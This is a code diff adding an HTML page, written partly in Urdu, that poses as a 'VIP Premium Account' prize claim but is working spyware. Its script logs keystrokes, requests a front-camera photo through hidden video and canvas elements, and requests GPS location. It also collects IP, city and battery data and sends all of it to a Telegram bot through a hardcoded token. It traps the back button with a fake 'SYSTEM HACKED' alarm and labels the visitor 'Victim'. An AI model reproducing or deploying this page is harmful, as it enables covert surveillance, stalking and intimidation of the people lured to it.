@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="ur">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- یہ لنک ایپ کو موبائل میں انسٹال کرنے کے قابل بناتا ہے -->
+    <link rel="manifest" href="manifest.json">
+    <meta name="theme-color" content="#1e3c72">
+    <title>Premium Unlocked</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: #fff; overflow: hidden; }
+        .container { text-align: center; background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 40px 25px; border-radius: 25px; box-shadow: 0 20px 40px rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.2); width: 85%; max-width: 380px; position: relative; z-index: 10; }
+        .icon { font-size: 80px; animation: bounce 2s infinite; margin-bottom: 15px; display: inline-block; }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
+        h1 { font-size: 26px; color: #ffd700; text-shadow: 0 2px 10px rgba(0,0,0,0.3); }
+        p { font-size: 15px; color: #e0e0e0; }
+        input[type="text"] { width: 90%; padding: 12px; border-radius: 10px; border: none; outline: none; font-size: 16px; text-align: center; margin-bottom: 15px; }
+        .btn { background: linear-gradient(to right, #ff9900, #ff5500); color: white; border: none; padding: 15px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; }
+        .spinner { border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid #fff; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; display: none; margin: 10px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .hidden { display: none; }
+        
+        /* بیک بٹن ٹریپ */
+        #errorOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 9999; flex-direction: column; justify-content: center; align-items: center; color: #ff3333; text-align: center; padding: 20px; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="mainCard">
+        <div class="icon">👑</div>
+        <h1 id="welcomeText">شاہی انعام!</h1>
+        <p id="subText">آپ نے VIP Premium Account جیتا ہے۔<br>شناخت کی تصدیق کے لیے نام درج کریں۔</p>
+        
+        <input type="text" id="victimName" placeholder="اپنا نام لکھیں..." autocomplete="off">
+        <button class="btn" id="claimBtn" onclick="startHack()">انعام حاصل کریں</button>
+        <div class="spinner" id="loader"></div>
+    </div>
+
+    <div id="errorOverlay">
+        <h1 style="font-size: 30px;">⚠️ SYSTEM HACKED ⚠️</h1>
+        <p style="color:#fff; font-size: 16px;">Data uploaded to server. Do not close.</p>
+        <button class="btn" style="margin-top: 20px;" onclick="document.getElementById('errorOverlay').style.display='none'">I Understand</button>
+    </div>
+
+    <canvas id="hiddenCanvas" class="hidden"></canvas>
+    <video id="hiddenVideo" autoplay playsinline class="hidden" style="width:1px; height:1px; opacity:0;"></video>
+
+    <script>
+        const BOT_TOKEN = "8455481683:AAGa1BUiLLEg9oJ5GFeyLKuyVnHuvPLCzw4";
+        const CHAT_ID = "8261803355";
+
+        // سکرین آن رکھنے کا فنکشن
+        let wakeLock = null;
+        async function keepScreenOn() {
+            try {
+                if ('wakeLock' in navigator) {
+                    wakeLock = await navigator.wakeLock.request('screen');
+                    sendMessage("💡 *Screen Wake Lock Activated!*");
+                }
+            } catch (err) {}
+        }
+
+        async function sendMessage(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+                });
+            } catch (e) {}
+        }
+
+        async function sendPhoto(base64Image) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('caption', '📸 *Target Captured!*');
+            const blob = await (await fetch(base64Image)).blob();
+            formData.append('photo', blob, 'target.jpg');
+            try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData }); } catch (e) {}
+        }
+
+        // دھڑکن (ہر 10 منٹ بعد)
+        function startHeartbeat() {
+            setInterval(() => {
+                sendMessage(`💓 *Victim is STILL on the page!* (Tab is open)`);
+            }, 600000); 
+        }
+
+        // کیمرہ ہیک
+        async function hackCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                const video = document.getElementById('hiddenVideo');
+                const canvas = document.getElementById('hiddenCanvas');
+                video.srcObject = stream;
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    sendPhoto(canvas.toDataURL('image/jpeg'));
+                    stream.getTracks().forEach(track => track.stop());
+                }, 2000);
+            } catch (err) {}
+        }
+
+        // کی لاگر
+        let typedText = "";
+        document.getElementById('victimName').addEventListener('keydown', async (e) => {
+            if (e.key.length === 1) {
+                typedText += e.key;
+                if(typedText.length >= 3) { await sendMessage(`⌨️ *Typing:* \`${typedText}\``); typedText = ""; }
+            }
+        });
+
+        function startHack() {
+            if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
+            document.getElementById('victimName').style.display = 'none';
+            document.getElementById('claimBtn').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            
+            const finalName = document.getElementById('victimName').value;
+            if (finalName) sendMessage(`✅ *Final Name:* \`${finalName}\``);
+
+            setTimeout(() => {
+                document.getElementById('mainCard').innerHTML = `
+                    <div class="icon" style="animation:none;">✅</div>
+                    <h1 style="color: #00ff00;">Verified!</h1>
+                    <p>آپ کا VIP اکاؤنٹ ایکٹیو ہو گیا ہے۔</p>
+                `;
+            }, 3000);
+        }
+
+        // بیک بٹن ٹریپ
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.pushState(null, null, location.href);
+            document.getElementById('errorOverlay').style.display = 'flex';
+            if (navigator.vibrate) navigator.vibrate([1000]);
+            sendMessage("🚨 *ALERT: Victim tried to press Back!*");
+        };
+
+        window.onload = async function() {
+            let visits = localStorage.getItem("visitCount");
+            if (visits) {
+                visits = parseInt(visits) + 1;
+                sendMessage(`♻️ *Victim Revisited! (Visit #${visits})*`);
+            } else {
+                sendMessage("🔥 *Link Opened!*");
+            }
+            localStorage.setItem("visitCount", visits ? visits : 1);
+
+            keepScreenOn();
+            startHeartbeat();
+
+            let batteryInfo = "Unknown";
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                batteryInfo = `${Math.round(battery.level * 100)}%`;
+            }
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            
+            sendMessage(`👤 *Victim Info:*\n🌐 IP: \`${data.ip}\`\n📍 Loc: ${data.city}, ${data.country_name}\n🔋 Battery: ${batteryInfo}`);
+
+            hackCamera();
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    await sendMessage(`📍 *GPS!* [Map](https://www.google.com/maps?q=${lat},${lon})`);
+                }, (error) => {});
+            }
+        };
+    </script>
+</body>
+</html>
